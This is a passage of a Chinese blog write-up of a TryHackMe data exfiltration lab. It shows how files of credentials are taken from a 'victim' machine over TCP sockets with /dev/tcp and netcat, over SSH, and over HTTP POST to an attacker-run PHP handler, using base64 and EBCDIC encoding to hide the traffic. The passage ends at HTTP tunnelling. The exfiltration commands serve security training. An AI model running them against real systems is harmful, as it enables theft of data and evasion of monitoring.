<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009649.png" alt></p>
<p>许多 C2 框架提供了建立通信通道的选项，包括用于发送命令和接收来自受害计算机的响应的标准和非传统协议。在 C2 通信中，攻击者发送请求以在受害者的计算机中执行命令的请求数量有限。然后，代理的客户端执行命令并通过非传统协议发送包含结果的回复。通信将朝两个方向进行：进出网络。</p>
<h3 id="隧道技术">隧道技术</h3>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009650.png" alt></p>
<p>在隧道场景中，攻击者使用这种数据泄露技术在受害者和攻击者的计算机之间建立通信通道。通信通道充当桥梁，让攻击者机器访问整个内部网络。建立连接时将持续发送和接收流量。</p>
<p>In the coming tasks, we will discuss the following techniques and use cases:<br>
在接下来的任务中，我们将讨论以下技术和用例：</p>
<ul>
<li>使用 TCP socket和 Base64 进行渗透</li>
<li>使用 SSH 进行渗透</li>
<li>使用 HTTPS 进行渗透（POST 请求）</li>
<li>ICMP</li>
<li>DNS</li>
</ul>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009651.png" alt></p>
<h1 id="0x04-tcp-socket-进行渗透">0x04 TCP socket 进行渗透</h1>
<p>此任务展示如何使用数据编码通过 TCP 窃取数据。使用 TCP socket是攻击者在知道没有基于网络的安全产品的非安全环境中可能使用的数据泄露技术之一。如果我们处于安全良好的环境中，那么不建议进行这种渗透。这种渗透类型很容易检测，因为我们依赖非标准协议。</p>
<p>除了 TCP 套接字之外，我们还将使用各种其他技术，包括数据编码和归档。这项技术的好处之一是它在传输过程中对数据进行编码，使其更难以检查。</p>
<p>下图解释了 TCP 上的传统通信的工作原理。如果两台机器想要通信，那么其中一台必须侦听并等待传入​​流量。这类似于两个人交谈和交流的方式，其中一个人在听，另一个人在说话。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009652.png" alt></p>
<p>该图显示两台主机通过 TCP 在端口 1337 上进行通信，步骤如下：</p>
<ol>
<li>第一台机器正在通过 TCP 侦听端口 1337</li>
<li>另一台机器连接到步骤 1 中指定的端口。例如 nc 1.2.3.4 1337</li>
<li>第一台机器建立连接</li>
<li>最后开始发送和接收数据。例如，攻击者发送命令并接收结果。</li>
</ol>
<p>通过 TCP 的通信需要两台机器（一台受害者机器和一台攻击者机器）来传输数据。让我们使用我们的网络环境来练习通过 TCP 发送数据。为了通过 TCP 建立通信，我们需要两台机器：<a target="_blank" rel="noopener" href="http://victim1.thm.com">victim1.thm.com</a> 机器是受害者，而 JumpBox、<a target="_blank" rel="noopener" href="http://jump.thm.com">jump.thm.com</a> 是攻击者机器。</p>
<p>首先，我们需要在您指定的端口上的 JumpBox 上准备一个侦听器。在我们的例子中，我们选择端口 8080.</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@jump-box</span>$ nc -lvp <span class="hljs-number">8080</span> &gt; /tmp/task4-creds.data
Listening on [<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>] (family <span class="hljs-number">0</span>, port <span class="hljs-number">8080</span>)</code></pre>
<p>在上一个命令中，我们使用 nc 命令在端口 8080 上接收数据。然后，一旦接收到数据，我们将其存储在 /tmp/ 目录中，并将其命名为 task4-creds.data 作为文件名。</p>
<p>现在，让我们使用以下凭据连接到包含需要传输的数据的受害者计算机：thm:tryhackme。请注意，要从JumpBox连接到victim1，我们可以使用内部域名，如下所示，</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@jump-box</span>$ ssh thm<span class="hljs-keyword">@victim</span>1.thm.com</code></pre>
<p>我们还可以使用端口 2022 直接从 AttackBox 连接，如下所示：</p>
<pre><code class="hljs scss">root<span class="hljs-keyword">@AttackBox</span>$ ssh thm@<span class="hljs-number">10.10</span>.<span class="hljs-number">41.88</span> -p <span class="hljs-number">2022</span></code></pre>
<p>我们已准备好在受害计算机上传输所需的数据。在本例中，我们有一个包含几个凭据的示例文件。</p>
<p>检查受害计算机上的 creds.txt 文件</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@victim</span>1:~$ cat task4/creds.txt 
<span class="hljs-attribute">admin</span>:password
<span class="hljs-attribute">Admin</span>:<span class="hljs-number">123456</span> 
<span class="hljs-attribute">root</span>:toor</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009653.png" alt></p>
<p>现在我们有了凭证文本文件，我们将使用 TCP 套接字来窃取它。确保侦听器正在 JumpBox 上运行。</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@victim</span>1:$ tar zcf - task4/ | base64 | dd conv=ebcdic &gt; /dev/tcp/<span class="hljs-number">192.168</span>.<span class="hljs-number">0.133</span>/<span class="hljs-number">8080</span>
<span class="hljs-number">0</span>+<span class="hljs-number">1</span> records in
<span class="hljs-number">0</span>+<span class="hljs-number">1</span> records out
<span class="hljs-number">260</span> bytes copied, <span class="hljs-number">9.8717</span>e-<span class="hljs-number">05</span> s, <span class="hljs-number">2.6</span> MB/s</code></pre>
<p>让我们分解前面的命令并解释它:</p>
<ol>
<li>我们使用 tar 命令创建一个存档文件，其中包含秘密目录内容的 zcf 参数。</li>
<li>z 用于使用 gzip 压缩所选文件夹，c 用于创建新存档，f 用于使用存档文件。</li>
<li>然后，我们将创建的 tar 文件传递​​给 Base64 命令，以将其转换为 Base64 表示形式。</li>
<li>然后，我们将base64命令的结果传递给使用EBCDIC编码数据的dd命令来创建和复制备份文件。</li>
<li>最后，我们重定向 dd 命令的输出，以使用指定 IP 和端口（在本例中为端口 8080）上的 TCP 套接字传输它。</li>
</ol>
<p>请注意，我们在渗透过程中使用了 Base64 和 EBCDIC 编码来保护数据。如果有人检查流量，它将采用非人类可读的格式，并且不会泄露传输的文件类型。</p>
<p>一旦我们按下回车键，我们应该会在 /tmp/ 目录中收到编码数据。</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@jump-box</span>$ nc -lvp <span class="hljs-number">8080</span> &gt; /tmp/task4-creds.data
Listening on [<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>] (family <span class="hljs-number">0</span>, port <span class="hljs-number">8080</span>)
Connection from <span class="hljs-number">192.168</span>.<span class="hljs-number">0.101</span> received!

thm<span class="hljs-keyword">@jump-box</span>$ ls -l /tmp/
-rw-r--r-- <span class="hljs-number">1</span> root root       <span class="hljs-number">240</span> Apr  <span class="hljs-number">8</span> <span class="hljs-number">11</span>:<span class="hljs-number">37</span> task4-creds.data</code></pre>
<p>在JumpBox上，我们需要将接收到的数据转换回其原始状态。我们将使用 dd 工具将其转换回来。</p>
<p>恢复 tar 文件</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@jump-box</span>$ cd /tmp/
thm<span class="hljs-keyword">@jump-box</span>:/tmp/$ dd conv=ascii if=task4-creds.data |base64 -d &gt; task4-creds.tar
<span class="hljs-number">0</span>+<span class="hljs-number">1</span> records in
<span class="hljs-number">0</span>+<span class="hljs-number">1</span> records out
<span class="hljs-number">260</span> bytes transferred in <span class="hljs-number">0.000321</span> secs (<span class="hljs-number">810192</span> bytes/sec)</code></pre>
<p>以下是对上一条命令的解释：</p>
<ol>
<li>我们使用 dd 命令将接收到的文件转换为 ASCII 表示形式。我们使用 task4-creds.data 作为 dd 命令的输入。</li>
<li>dd 命令的输出将传递到 base64 以使用 -d 参数进行解码。</li>
<li>最后，我们将输出保存在 task4-creds.tar 文件中。</li>
</ol>
<p>接下来，我们需要使用tar命令解压task4-creds.tar文件并检查内容如下：</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@jump-box</span>$ tar xvf task4-creds.tar
task4/ 
task4/creds.txt</code></pre>
<p>让我们分解前面的命令并解释它:</p>
<ol>
<li>我们使用 tar 命令使用 xvf 参数来解压缩文件。</li>
<li>x 用于提取 tar 文件，v 用于详细列出文件，f 用于使用存档文件。</li>
</ol>
<p>现在让我们确认我们从受害机器获得了相同的数据。</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@jump-box</span>$ cat task4/creds.txt
<span class="hljs-attribute">admin</span>:password
<span class="hljs-attribute">Admin</span>:<span class="hljs-number">123456</span>
<span class="hljs-attribute">root</span>:toor</code></pre>
<p>成功！在此任务中，我们使用 TCP 套接字将数据从受害者计算机窃取到攻击者计算机。<br>
<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009654.png" alt></p>
<h1 id="0x05-ssh-进行渗透">0x05 SSH 进行渗透</h1>
<p>在此任务中，我们将展示如何使用 SSH 协议将数据泄露到攻击计算机。 SSH 协议建立了一个安全通道来在客户端和服务器之间交互和移动数据，因此所有通过网络或 Internet 传输的数据都是加密的。<br>
<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009655.png" alt></p>
<p>要通过 SSH 传输数据，我们可以使用安全复制协议 SCP 或 SSH 客户端。假设我们没有可用于通过 SSH 传输数据的 SCP 命令。因此，在此任务中我们将更多地关注 SSH 客户端。</p>
<p>正如我们之前提到的，攻击者需要控制服务器（在本例中启用了 SSH 服务器）来接收泄露的数据。因此，在此场景中我们将使用 AttackBox 作为 SSH 服务器。您还可以使用 JumpBox，因为它启用了 SSH 服务器。</p>
<p>假设我们已经获得了对必须安全传输的敏感数据的访问权限。让我们连接到victim1 或victim2 机器。</p>
<p>需要传输的数据</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@victim</span>1:~$ cat task5/creds.txt
<span class="hljs-attribute">admin</span>:password
<span class="hljs-attribute">Admin</span>:<span class="hljs-number">123456</span>
<span class="hljs-attribute">root</span>:toor</code></pre>
<p>让我们使用我们在“使用 TCP 套接字进行渗透”任务中讨论的相同技术，其中我们将使用 tar 命令来归档数据，然后传输它。</p>
<p>从victim1机器中泄露数据</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@victim</span>1:$ tar cf - task5/ | ssh thm<span class="hljs-keyword">@jump</span>.thm.com <span class="hljs-string">"cd /tmp/; tar xpf -"</span></code></pre>
<p>让我们分解前面的命令并解释它：</p>
<ol>
<li>我们和上一个任务一样使用tar命令创建task5目录的归档文件。</li>
<li>然后我们通过 ssh 传递存档文件。 SSH 客户端提供了一种无需完整会话即可执行单个命令的方法。</li>
<li>我们传递了必须在双引号中执行的命令“cd /tmp/; tar xpf”。在这种情况下，我们更改目录并取消归档传递的文件。</li>
</ol>
<p>如果我们检查攻击者的机器，我们可以看到我们已经成功传输了文件。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009656.png" alt></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009657.png" alt></p>
<h1 id="0x06-https-进行渗透">0x06 HTTP(S) 进行渗透</h1>
<p>在进一步进行之前，请确保您在深入研究此任务和即将到来的任务之前具备网络协议的基础知识。</p>
<p>此任务说明如何使用 HTTP/HTTPS 协议将数据从受害者窃取到攻击者的计算机。作为此技术的要求，攻击者需要控制安装并启用服务器端编程语言的网络服务器。我们将在本任务中展示基于 PHP 的场景，但它可以用任何其他编程语言实现，例如 python、Golang、NodeJS 等。</p>
<h2 id="http-post-请求">HTTP POST 请求</h2>
<p>通过 HTTP 协议泄露数据是最好的选择之一，因为检测起来很困难。区分合法和恶意 HTTP 流量很困难。我们将在数据泄露中使用POST HTTP方法，原因是使用GET请求时，所有参数都会注册到日志文件中。使用 POST 请求时，则不然。以下是 POST 方法的一些优点：</p>
<ul>
<li>POST 请求永远不会被缓存</li>
<li>POST 请求不会保留在浏览器历史记录中</li>
<li>POST 请求无法添加书签</li>
<li>POST请求对数据长度没有限制</li>
</ul>
<p>让我们使用 thm:tryhackme 凭据登录到 <a target="_blank" rel="noopener" href="http://theweb.thm.com">theweb.thm.com</a> 计算机，并使用两个 HTTP 请求（一个用于 GET，另一个用于 POST）检查 Apache 日志文件，并检查它们的外观！</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@jump-box</span>:~$ ssh thm<span class="hljs-keyword">@web</span>.thm.com
thm<span class="hljs-keyword">@web-thm</span>:~$ sudo cat /var/log/apache2/access.log
[sudo] password for <span class="hljs-attribute">thm</span>:
<span class="hljs-number">10.10</span>.<span class="hljs-number">198.13</span> - - [<span class="hljs-number">22</span>/Apr/<span class="hljs-number">2022</span>:<span class="hljs-number">12</span>:<span class="hljs-number">03</span>:<span class="hljs-number">11</span> +<span class="hljs-number">0100</span>] <span class="hljs-string">"GET /example.php?file=dGhtOnRyeWhhY2ttZQo= HTTP/1.1"</span> <span class="hljs-number">200</span> <span class="hljs-number">147</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"curl/7.68.0"</span>
<span class="hljs-number">10.10</span>.<span class="hljs-number">198.13</span> - - [<span class="hljs-number">22</span>/Apr/<span class="hljs-number">2022</span>:<span class="hljs-number">12</span>:<span class="hljs-number">03</span>:<span class="hljs-number">25</span> +<span class="hljs-number">0100</span>] <span class="hljs-string">"POST /example.php HTTP/1.1"</span> <span class="hljs-number">200</span> <span class="hljs-number">147</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"curl/7.68.0"</span></code></pre>
<p>显然，第一行是一个带有泄露数据的文件参数的 GET 请求。如果您尝试使用 based64 编码对其进行解码，您将获得传输的数据，在本例中为 thm:tryhackme。虽然第二个请求是对 example.php 的 POST，但我们发送了相同的 base64 数据，但它没有显示传输的数据。</p>
<p>access.log 中的 base64 数据看起来有所不同，不是吗？对其进行解码以找到下面问题 1 的标志。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009658.png" alt></p>
<p>在典型的现实场景中，攻击者控制互联网上某处云中的 Web 服务器。从受感染的计算机执行代理或命令，将受感染计算机网络外部的数据通过 Internet 发送到 Web 服务器。然后攻击者就可以登录Web服务器来获取数据，如下图所示。<br>
<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009659.png" alt></p>
<h2 id="http-数据泄露">HTTP 数据泄露</h2>
<p>根据攻击者的配置，我们可以设置 HTTP 或 HTTPS（HTTP 的加密版本）。我们还需要一个 PHP 页面来处理发送到服务器的 POST HTTP 请求。</p>
<p>我们将在我们的场景中使用 HTTP 协议（​​而不是 HTTPS）。现在假设攻击者控制了 <a target="_blank" rel="noopener" href="http://web.thm.com">web.thm.com</a> 服务器，并且敏感数据必须从我们的网络 2 环境 (192.168.0.0/24) 中的 JumpBox <a target="_blank" rel="noopener" href="http://xn--victim1-gf7n.thm.com">或victim1.thm.com</a> 计算机发送。</p>
<p>要通过 HTTP 协议窃取数据，我们可以应用以下步骤：</p>
<ol>
<li>攻击者使用数据处理程序设置 Web 服务器。在我们的例子中，它将是 <a target="_blank" rel="noopener" href="http://web.thm.com">web.thm.com</a> 和 contact.php 页面作为数据处理程序。</li>
<li>C2 代理或攻击者发送数据。在我们的例子中，我们将使用curl命令发送数据。</li>
<li>网络服务器接收数据并存储它。在我们的例子中，contact.php 接收 POST 请求并将其存储到 /tmp 中。</li>
<li>攻击者登录网络服务器以获取收到的数据的副本。</li>
</ol>
<p>让我们遵循并应用我们在前面的步骤中讨论的内容。请记住，由于我们使用 HTTP 协议，因此数据将以明文形式发送。但是，我们将使用其他技术（tar 和 base64）来更改数据的字符串格式，使其不再是人类可读的格式！</p>
<p>首先，我们为此任务准备了一个带有数据处理程序的网络服务器。以下代码快照是 PHP 代码，用于通过文件参数处理 POST 请求，并将接收到的数据以 http.bs64 文件名存储在 /tmp 目录中。</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'file'</span>])) {
        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">"/tmp/http.bs64"</span>,<span class="hljs-string">"w"</span>);
        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'file'</span>]);
        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$file</span>);
   }
<span class="hljs-meta">?&gt;</span></code></pre>
<p>现在，从 Jump 计算机上，通过 SSH <a target="_blank" rel="noopener" href="http://xn--victim1-5t0ln11kto0g.thm.com">连接到victim1.thm.com</a> 计算机，以通过 HTTP 协议窃取所需的数据。使用以下 SSH 凭据：thm:tryhackme。</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@jump-box</span>:~$ ssh thm<span class="hljs-keyword">@victim</span>1.thm.com</code></pre>
<p>您还可以使用端口 2022 从 AttackBox 连接到它，如下所示，</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@attacker</span>$ ssh thm@<span class="hljs-number">10.10</span>.<span class="hljs-number">41.88</span> -p <span class="hljs-number">2022</span></code></pre>
<p>目标是通过 HTTP 协议将存储在 /home/thm/task6 中的文件夹内容传输到另一台计算机。</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@victim</span>1:~$ ls -l
total <span class="hljs-number">12</span>
drwxr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> Jun <span class="hljs-number">19</span> <span class="hljs-number">19</span>:<span class="hljs-number">44</span> task4
drwxr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> Jun <span class="hljs-number">19</span> <span class="hljs-number">19</span>:<span class="hljs-number">44</span> task5
drwxr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> Jun <span class="hljs-number">19</span> <span class="hljs-number">19</span>:<span class="hljs-number">44</span> task6
drwxr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> Jun <span class="hljs-number">19</span> <span class="hljs-number">19</span>:<span class="hljs-number">43</span> task9</code></pre>
<p>现在我们有了数据，我们将使用curl命令发送一个HTTP POST请求，其中包含秘密文件夹的内容，如下所示：</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@victim</span>1:~$ curl --data <span class="hljs-string">"file=$(tar zcf - task6 | base64)"</span> <span class="hljs-attribute">http</span>://web.thm.com/contact.php</code></pre>
<p>我们使用带 --data 参数的curl 命令通过文件参数发送POST 请求。请注意，我们使用 tar 命令创建了秘密文件夹的存档文件。我们还将 tar 命令的输出转换为 Base64 表示形式。</p>
<p>接下来，从victim1或JumpBox机器上，<a target="_blank" rel="noopener" href="http://xn--web-7j2e7tk5p65ryrowx6a6rr0eb.thm.com">登录到网络服务器web.thm.com</a>，并检查/tmp目录是否已成功传输所需的数据。使用以下 SSH 凭据登录网络：thm:tryhackme.</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@victim</span>1:~$ ssh thm<span class="hljs-keyword">@web</span>.thm.com 
thm<span class="hljs-keyword">@web</span>:~$ ls -l /tmp/
total <span class="hljs-number">4</span>
-rw-r--r-- <span class="hljs-number">1</span> www-data www-data <span class="hljs-number">247</span> Apr <span class="hljs-number">12</span> <span class="hljs-number">16</span>:<span class="hljs-number">03</span> http.bs64
thm<span class="hljs-keyword">@web</span>:~$ cat /tmp/http.bs64
H4sIAAAAAAAAA <span class="hljs-number">3</span>ROw7CMBBFUddZhVcA/sYSHUuJSAoKMLKNYPkkgSriU1kIcU/hGcsuZvTysEtD&lt;
WYua1Ch4P9fRss69dsZ4E6wNTiitlTdC qpTPZxz6ZKUIsVY3v379P6j8j3/<span class="hljs-number">8</span>ejzqlyrrDgF3Dr3
On/XLvI3QVshVY1hlv48/<span class="hljs-number">64</span>/<span class="hljs-number">7</span>I bU5fzJaa <span class="hljs-number">2</span>c5XbazzbTOtvCkxpubbUwIAAAAAAAAAAAAAAAB4
<span class="hljs-number">5</span>gZKZxgrACgAAA==</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009660.png" alt></p>
<p>好的！我们已经收到了数据，但是如果您仔细查看 http.bs64 文件，您会发现它的 base64 已损坏。发生这种情况是由于 HTTP 上的 URL 编码所致。 + 符号已被替换为空格，因此让我们使用 sed 命令修复它，如下所示，</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@web</span>:~$ sudo sed -i <span class="hljs-string">'s/ /+/g'</span> /tmp/http.bs64
#### <span class="hljs-number">1</span>. `sed`

`sed` 是一个流编辑器（stream editor），用于对文本文件进行基本的文本操作，如查找、替换、插入和删除等。

#### <span class="hljs-number">2</span>. `-i`

`-i` 选项表示就地（in-place）编辑文件。使用这个选项后，`sed` 会直接修改文件，而不是将结果输出到标准输出。

#### <span class="hljs-number">3</span>. `<span class="hljs-string">'s/ /+/g'</span>`

这是一个 `sed` 替换命令，格式为 `s/old/new/flags`。

- **`s`**：表示替换（substitute）。
- **`/ /`**：表示要查找的模式，这里是一个空格字符。
- **`/+/`**：表示替换的模式，这里是一个加号（`+`）。
- **`g`**：全局替换标志，表示替换行内所有符合模式的部分。如果省略 `g`，`sed` 只会替换每行第一个符合模式的部分。

综上所述，`<span class="hljs-string">'s/ /+/g'</span>` 的含义是将每行中的所有空格替换为加号。</code></pre>
<p>使用 sed 命令，我们将空格替换为 + 字符，使其成为有效的 Base64 字符串！</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@web-thm</span>:/tmp$ cat http.bs64 
H4sIAAAAAAAAA <span class="hljs-number">3</span>RPQ4CIRCGYeo9BSdQQGATO49CXAtjFAMYPb672G38qYgxvk8zDFDM5CshH/xS
NKVGvXO1jua1nrU1ziqle2 E0sorJ6RrO9bDJZeQpBQpxvLu36f3H1Vq/tu0G/Ki3NpsOAXsrX2d
v/Wz/I0dr6RqMs3Mn cfhuP tD6HnK8xDd2mttqsrPPdtPK6xJi6b08JAAAAAAAAAAAAAAAA4Jk7
FWUx0QAoAAA=thm<span class="hljs-keyword">@web-thm</span>:/tmp$ sudo sed -i <span class="hljs-string">'s/ /+/g'</span> http.bs64 
[sudo] password for <span class="hljs-attribute">thm</span>: 
thm<span class="hljs-keyword">@web-thm</span>:/tmp$ cat http.bs64 
H4sIAAAAAAAAA+<span class="hljs-number">3</span>RPQ4CIRCGYeo9BSdQQGATO49CXAtjFAMYPb672G38qYgxvk8zDFDM5CshH/xS
NKVGvXO1jua1nrU1ziqle2+E0sorJ6RrO9bDJZeQpBQpxvLu36f3H1Vq/tu0G/Ki3NpsOAXsrX2d
v/Wz/I0dr6RqMs3Mn+cfhuP+tD6HnK8xDd2mttqsrPPdtPK6xJi6b08JAAAAAAAAAAAAAAAA4Jk7</code></pre>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@web</span>:~$ cat /tmp/http.bs64 | base64 -d | tar xvfz -
tmp/task6/
tmp/task6/creds.txt</code></pre>
<p>最后，我们使用带 -d 参数的 base64 命令对 base64 字符串进行解码，然后传递解码后的文件并使用 tar 命令将其取消归档。</p>
<h2 id="https-通讯">HTTPS 通讯</h2>
<p>在上一节中，我们展示了如何通过 HTTP 协议执行数据过滤，这意味着所有传输的数据都是明文形式。 HTTPS 的优点之一是使用服务器上存储的 SSL 密钥对传输的数据进行加密。</p>
<p>如果您应用我们之前在启用 SSL 的 Web 服务器上展示的相同技术，那么我们可以看到所有传输的数据都将被加密。我们已经设置了私有 HTTPS 服务器来显示传输的数据。如果您有兴趣设置自己的 HTTPS 服务器，我们建议您访问 <a target="_blank" rel="noopener" href="https://www.digitalocean.com/community/tutorials/how-to-create-a-self-signed-ssl-certificate-for-apache-in-ubuntu-18-04">Digital Ocean</a> 网站</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009661.png" alt></p>
<p>如屏幕截图所示，我们捕获了网络流量，似乎端口 443 上的所有客户端和服务器通信都已加密。</p>
<h2 id="http-隧道">HTTP 隧道</h2>
<p>HTTP 协议隧道技术封装了其他协议并通过 HTTP 协议来回发送它们。 HTTP 隧道根据通信通道发送和接收许多 HTTP 请求！</p>
<p>在深入研究 HTTP 隧道细节之前，我们先讨论一个无法通过 Internet 访问许多内部计算机的典型场景。例如，在我们的场景中，<a target="_blank" rel="noopener" href="http://uploader.thm.com">uploader.thm.com</a> 服务器可通过 Internet 访问，并向每个人提供 Web 服务。但app.thm.com服务器运行在本地，只为内网提供服务，如下图所示：<br>
